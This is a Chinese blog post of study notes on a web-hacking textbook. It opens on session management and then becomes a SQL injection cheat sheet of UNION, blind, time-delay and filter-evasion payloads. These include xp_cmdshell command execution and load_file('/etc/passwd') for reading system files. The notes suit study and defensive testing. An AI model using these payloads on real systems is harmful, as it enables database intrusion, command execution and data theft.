@@ -1,0 +1,241 @@
+
+
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>黑客攻防技术宝典web实战篇笔记4 | XEI7 乱M集</title>
+  <meta name="author" content="XEI7">
+  
+  <meta name="description" content="攻击会话管理">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="黑客攻防技术宝典web实战篇笔记4"/>
+  <meta property="og:site_name" content="XEI7 乱M集"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/imgs/favicon.ico" rel="icon" type="image/x-ico">
+  <link rel="alternate" href="/atom.xml" title="XEI7 乱M集" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+
+<body>
+  <header><div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/imgs/logo.png" alt="XEI7 乱M集" title="XEI7 乱M集"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name">XEI7 乱M集</h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/urls">_</a></li>
+					
+
+				</ul>
+			</nav>			
+</div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header class="article-info clearfix">
+  <h1 itemprop="name">
+	黑客攻防技术宝典web实战篇笔记4
+  </h1>
+  <p class="article-author">By
+    
+      <a href="https://xei7.github.io" title="XEI7">XEI7</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2016-01-08T04:57:39.000Z" itemprop="datePublished">2016-01-08</time>
+    更新日期:<time datetime="2016-02-01T04:52:14.388Z" itemprop="dateModified">2016-02-01</time>
+    
+  </p>
+</header>
+    <div class="entry">
+		
+        <p>攻击会话管理<br><a id="more"></a><br>会话令牌生成过程中的薄弱环节； 在整个生命周期过程中处理会话令牌的薄弱环节。</p>
+<h4 id="状态要求-p172"><a href="#状态要求-p172" class="headerlink" title="状态要求  p172"></a>状态要求  p172</h4><h4 id="令牌可预测"><a href="#令牌可预测" class="headerlink" title="令牌可预测"></a>令牌可预测</h4><p>隐含序列； 时间依赖； 生成的数字随机性不强</p>
+<p>p238<br>1.尝试输入一个结果等于原始数字值的简单学表达式。例如，如果原始值为2，尝试提交1+1或3-1.如果应用程序做出相同的响应，则表示它易于受到攻击。<br>2.如果证实被修改的数据会对应用程序的行为造成明显影响，则前面描述的测试方法最为可靠。例如，如果应用程序使用数字化PageID参数指定应返回什么内容，则用1+1代替2得到相同的结果名校表示存在SQL注入。但是，如果能够在数字化参数中插入任意输入，但应用程序的行为却没有发生改变，那么前面的检测方法就无法发现漏洞。<br>3.如果在第一个测试方法取得成功，你可以利用更复杂的、使用特殊SQL关键字和语法的表达式进一步获得与漏洞有关的证明。ASCII值为65，在SQL中，以下表达式等于2. 67-ASCII(‘A’)<br>4.如果单引号被过滤掉，那么前面的测试方法就没有作用。但是，这时可以利用这样一个事实：即在必要时，数据库会隐含的将数字数据转化为字符串数据。例如，因为字符1的ASCII值为49，在SQL    中，以下表达式等于2.  51-ASCII（1）</p>
+<h4 id="注入查询结构"><a href="#注入查询结构" class="headerlink" title="注入查询结构"></a>注入查询结构</h4><p>1.记下任何可能控制应用程序返回的结果的顺序或其中的字段类型的参数<br>2.提供一系列在参数值中提交数字值的请求，从数字1开始，然后逐个请求递增。<br> 如果更改输入中的数字会影响结果的顺序，则说明输入可能被插入到ORDER BY 子句中。在sql中，ORDER BY 1将依据第一个列进行排序。然后，将这个数字增加到2将更改数据的显示顺序，以依据第二个列进行排序。如果提交的数字大于结果集中的列数，查询将会失败。在这种情况下，你可以通过使用一下字符串，检查是否可以颠倒结果的顺序，从而确认是否可以注入其他sql：<br>1 ASC –<br>1 DESC –<br> 如果提交数字1生成一组结果，其中一个列的每一行都包含一个1，则说明输入可能被插入到查询返回的列的名称中，例如：<br>select 1,title,year from books where publisher=’Wiley’</p>
+<h4 id="指纹识别数据库"><a href="#指纹识别数据库" class="headerlink" title="指纹识别数据库"></a>指纹识别数据库</h4><p>oracle : ‘serv’||’ices’<br>MS-sql : ‘serv’+’ices’<br>Mysql :  ‘serv’空格’ices’<br>如果注入数字数据，则可以使用下面的攻击字符串来识别数据库。每个数据库在目标数据库中的求值结果为0，在其他数据库则会导致错误。<br>orcale ：BITAND(1,1)-BITAND(1,1)<br>ms-sql： @@PACK_RECEIVED-@@PACK_RECEIVED<br>Mysql: CONNECTION_ID()-CONNECTION_ID()</p>
+<p>UNION<br>‘UNION SELECT NULL–<br>‘UNION SELECT NULL,NULL–<br>‘UNION SELECT NULL,NULL,NULL–<br>确定列后<br>‘UNION SELECT ‘a’,NULL,NULL–<br>‘UNION SELECT NULL,’a’,NULL–<br>‘UNION SELECT NULL,NULL,’a’–</p>
+<p>Oracle: SELECT table_name||’:’||column_name FROM all_tab_columns<br>MS-SQL: SELECT table_name+’:’+column_name from information_schema.columns<br>MySQL : SELECT CONCAT(table_name,’:’,column_name) from information_schema.columns</p>
+<p>9.2.8 避开过滤<br>1.列名单引号，通过字符串函数使用每个字符ASCII<br>select ename,sa1 from emp where ename=’mar’<br>select ename,sa1 from emp where ename=CHR(109)||CHR(97)||CHR(114)<br>select ename,sa1 from emp where ename=CHR(109)+CHR(97)+CHR(114)</p>
+<p>注释字符被阻止<br>‘ or 1=1–<br>‘ or ‘a’=’a<br>在MSSQL数据库注入批量查询，不必使用分好分隔符。只要纠正所有批量查询的语法，无论你是否使用分好，查询解析器都会正确解释他们。<br>2.避免使用简单确认<br>SeLeCt<br>%00SELECT<br>SELSELECTECT<br>%53%45%4C%45%43%54<br>%2553%2545%254C%2545%2543%2554<br>3.使用SQL注释<br>SQL语句注释内容包含再/<em>与</em>/符号之间。如果应用程序阻止或删除输入中的空格，可以使用注释“冒充”<br>SELECT/<em>foo</em>/username,password/<em>foo</em>/FROM/<em>foo</em>/users<br>SELECT/<em>foo</em>/username,password/<em>foo</em>/FR/<em>foo</em>/OM users<br>4.利用有缺陷的过滤<br>输入确认机制通常包含逻辑缺陷，可以对这些缺陷加以利用，使用被阻止的输入避开过滤。多数情况下，这类攻击会利用应用程序再多个确认步骤进行排序，或未能以递归方式应用净化逻辑方面缺陷。</p>
+<p>9.2.9 二阶SQL输入 247</p>
+<p>高级利用 P 249<br>SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’</p>
+<p>input: foo’ || (SELECT 1 FROM dual WHERE  (SELECT username FROM all_users WHERE username = ‘DBSNMP’)=’DBSNMP’)–</p>
+<p>SELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE  (SELECT username FROM all_users WHERE username = ‘DBSNMP’)=’DBSNMP’)</p>
+<p>admin’ AND ASCII(SUBSTRING(‘Admin’,1,1))=65–<br>P254</p>
+<p>9.2.13<br>Oracle ASCII(‘A’) 65 SUBSTR(‘ABCDE’,2,3)  BCD<br>MS-SQL ASCII(‘A’) 65 SUBSTRING(‘ABCDE’,2,3) BCD<br>MYSQL  ASCII(‘A’) 65 SUBSTRING(‘ABCDE’,2,3) BCD<br>获取当前数据库用户<br>Oracle select Sys.login_user from dual select user FROM dual SYS_CONTEXT(‘USERENV’,’SESSION_USER’)<br>MSSQL select suser_sname()<br>MYSQL SELECT user()<br>引起时间延迟<br>oracle Utl_Http.request(‘<a href="http://madeupserver.com" target="_blank" rel="external">http://madeupserver.com</a>‘)<br>mssql  waitfor delay ‘0:0:10” exec master ..xp_cmdshell ‘ping localhost’<br>mysql  sleep(10)<br>获取数据库版本<br>o select banner from v$version<br>s select @@version<br>y select @@version<br>获取当前数据库<br>o select SYS_CONTEXT(‘USERENV’,’DB_NAME’) FROM dual<br>s select db_name()   select @@servername<br>y select database()<br>获取当前用户权限<br>o select privilege from session_privs<br>s select grantee,table_name,privilege_type from INFORMATION_SCHEMA,TABLE_PRIVILEGES<br>y select * from information_schema.user_privileges where grantee = ‘[user]’<br>在单独的结果列显示所有表和列<br>o select table_name||’ ‘||column_name from all_tab_columns<br>s select table_name+’ ‘,column_name from information_schema.columns<br>y select CONCAT(table_name+’ ‘,column_name) from information_schema.columns<br>显示用户对象<br>o select object_name, object_name,object_type from user_objects<br>s select name from sysobjects<br>y select table_name from information_schema.tables  (或trigger_name from information_schema.trigers)<br>显示用户表<br>o select object_name,object_type from user_objects wherer object_type=’TABLE’<br>  SELECT table_name from all_tables<br>s select name from sysobjects where extype=’U’<br>y select table_name from information_schema.tables where table_type=’BASE TABLE’ and table_schema!=’mysql’<br>显示表foo的列名称<br>o select column_name, name from user_tab_columns where table_name=’foo’<br>s select column_name from information_schema.columns where table_name=’foo’<br>y select column_name from information_schema.columns where table_name=’foo’<br>与操作系统交互<br>s exec xp_cmshell ‘dir c:\’<br>y select load_file(‘/etc/passwd’)</p>
+<p>P268</p>
+
+    </div>
+    <footer>
+        
+  
+  <div class="categories">
+    <a href="/categories/web/">web</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/web/">web</a>
+  </div>
+ 
+        <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+ <nav id="pagination" >
+    
+    <a href="/2016/01/10/PHP代码审计tips/" class="alignleft prev" title="PHP代码审计tips">PHP代码审计tips</a>
+    
+    
+    <a href="/2016/01/06/代码审计思路/" class="alignright next" title="代码审计思路">代码审计思路</a>
+    
+    <div class="clearfix"></div>
+</nav>
+
+
+
+	
+	<section id="comment">
+		<!-- 多说评论框 start -->
+		<div class="ds-thread" data-thread-key="2016/01/08/黑客攻防技术宝典web实战篇笔记4/" data-title="黑客攻防技术宝典web实战篇笔记4" data-url="https://xei7.github.io/2016/01/08/黑客攻防技术宝典web实战篇笔记4/"></div>
+		<!-- 多说评论框 end -->
+		<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+		<script type="text/javascript">
+		var duoshuoQuery = {short_name:"xei7"};
+		(function() {
+			var ds = document.createElement('script');
+			ds.type = 'text/javascript';ds.async = true;
+			ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+			ds.charset = 'UTF-8';
+			(document.getElementsByTagName('head')[0] 
+			 || document.getElementsByTagName('body')[0]).appendChild(ds);
+		})();
+		</script>
+		<!-- 多说公共JS代码 end -->
+	</section>
+	
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/bluetooth/">bluetooth</a><small>2</small></li>
+  
+    <li><a href="/categories/kali/">kali</a><small>3</small></li>
+  
+    <li><a href="/categories/linux/">linux</a><small>2</small></li>
+  
+    <li><a href="/categories/python/">python</a><small>1</small></li>
+  
+    <li><a href="/categories/sdr/">sdr</a><small>1</small></li>
+  
+    <li><a href="/categories/sqlmap/">sqlmap</a><small>3</small></li>
+  
+    <li><a href="/categories/web/">web</a><small>7</small></li>
+  
+    <li><a href="/categories/中医/">中医</a><small>4</small></li>
+  
+    <li><a href="/categories/安全/">安全</a><small>5</small></li>
+  
+    <li><a href="/categories/网络/">网络</a><small>1</small></li>
+  
+    <li><a href="/categories/逆向/">逆向</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/aircrack/" style="font-size: 10px;">aircrack</a> <a href="/tags/bash/" style="font-size: 10px;">bash</a> <a href="/tags/bluetooth/" style="font-size: 12.5px;">bluetooth</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/elf/" style="font-size: 12.5px;">elf</a> <a href="/tags/kali/" style="font-size: 12.5px;">kali</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/rtl-sdr/" style="font-size: 10px;">rtl-sdr</a> <a href="/tags/sqlmap/" style="font-size: 12.5px;">sqlmap</a> <a href="/tags/sqlmapapi/" style="font-size: 10px;">sqlmapapi</a> <a href="/tags/waf/" style="font-size: 10px;">waf</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/中医/" style="font-size: 15px;">中医</a> <a href="/tags/五行/" style="font-size: 10px;">五行</a> <a href="/tags/养生/" style="font-size: 12.5px;">养生</a> <a href="/tags/审计/" style="font-size: 10px;">审计</a> <a href="/tags/工控/" style="font-size: 10px;">工控</a> <a href="/tags/批量/" style="font-size: 10px;">批量</a> <a href="/tags/易经/" style="font-size: 10px;">易经</a> <a href="/tags/端口/" style="font-size: 10px;">端口</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a> <a href="/tags/绕过/" style="font-size: 10px;">绕过</a> <a href="/tags/重装/" style="font-size: 10px;">重装</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">友情链接</h3>
+<ul class="entry">
+<li><a href="http://blog.sina.com.cn/3838120958 " title=" Blog" target="_blank">_</a></li>
+</ul>
+</div>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<!--script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"-->
+</script>
+</body>
+</html>
+
+
